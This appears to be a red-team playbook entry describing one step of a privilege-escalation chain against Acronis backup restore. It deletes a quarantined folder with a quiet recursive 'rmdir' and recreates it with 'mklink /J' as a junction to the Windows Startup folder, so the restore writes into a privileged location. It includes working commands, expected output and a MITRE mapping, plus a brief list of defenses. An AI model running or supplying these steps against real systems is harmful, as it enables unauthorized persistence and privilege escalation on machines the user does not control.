---
id: cleanup-create-junction
tags:
  - directory-junction
  - mklink
  - cleanup
type: procedure
tools: []
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/rmdir-delete-eicar]]'
  - '[[commands/mklink-create-junction]]'
verified: false
platforms:
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Registry Run Keys - Startup Folder]]'
  - '[[Windows Command Shell]]'
updated_at: '2025-12-14T17:29:44.741Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Registry Run Keys - Startup Folder]]'
  - '[[Windows Command Shell]]'
---
# Cleanup-and-Create-Directory-Junction

## Summary

This procedure removes the original directory and recreates it as a directory junction pointing to a privileged location, such as the Windows Startup folder, to redirect the upcoming restore operation.

## Description

Post-quarantine, delete the source folder to avoid conflicts, then use mklink to create a junction (NTFS directory symlink) from the original path to a protected directory. Acronis restore validates symlinks but not junctions, allowing writes to areas like Startup for persistence or SYSTEM paths for escalation. Target examples: Startup for user privs or C:\Windows\System32 for higher impact.

## Requirements

1. Admin rights not needed for user-level junctions, but target may require
2. NTFS file system
3. Original folder empty post-quarantine

## Defense

Defensive measures and detection strategies:

- Block junction creation to sensitive paths via AppLocker or WDAC
- Monitor mklink executions in event logs (Event ID 4656)
- AV should scan and block junction abuse in restore paths

## Objectives

1. Clear path for junction setup
2. Redirect restore to privileged area
3. Enable escalation or persistence

## Instructions

### Step 1: Delete Original Folder

**Context**: Ensures clean recreation as junction.

**Command** ([[commands/rmdir-delete-eicar]]):
```cmd
rmdir /S /Q %userprofile%\Desktop\eicar
```

> Recursively and quietly removes the directory. Expected output: No output, folder gone.

### Step 2: Create Directory Junction

**Context**: Links the folder to privileged target.

**Command** ([[commands/mklink-create-junction]]):
```cmd
mklink /J %userprofile%\Desktop\eicar "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

> Creates a junction to Startup folder. Expected output: 'Junction created for eicar'.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]] Privilege Escalation

### Techniques

- [[Registry Run Keys - Startup Folder]] Registry Run Keys / Startup Folder
- [[Windows Command Shell]] Windows Command Shell

### Sub-Techniques

-

## Commands Used

- [[commands/rmdir-delete-eicar]]
- [[commands/mklink-create-junction]]

## Tools Used

-

## Tags

- directory-junction
- mklink
- cleanup
